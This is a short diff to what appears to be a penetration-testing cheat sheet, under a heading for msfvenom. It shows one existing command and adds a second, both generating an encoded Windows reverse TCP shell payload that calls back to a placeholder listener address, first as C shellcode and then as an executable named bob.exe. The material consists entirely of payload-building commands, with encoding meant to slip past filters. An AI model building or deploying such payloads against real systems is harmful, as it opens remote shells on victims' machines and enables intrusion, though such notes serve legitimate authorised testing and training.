@@ -16,3 +16,7 @@ msfvenom
 .. code-block:: shell
 
 	msfvenom -p windows/shell\_reverse\_tcp LHOST=<IP Address> LPORT=[port]-b "\\x00\\x0a\\x0d" -f c -a x86 --platform windows -e x86/shikata\_ga\_nai
+
+.. code-block:: shell
+
+ 	msfvenom -p windows/shell\_reverse\_tcp LHOST=<IP Address> LPORT=[port]-b "\\x00\\x0a\\x0d" -f exe > bob.exe -a x86 --platform windows -e x86/shikata\_ga\_nai
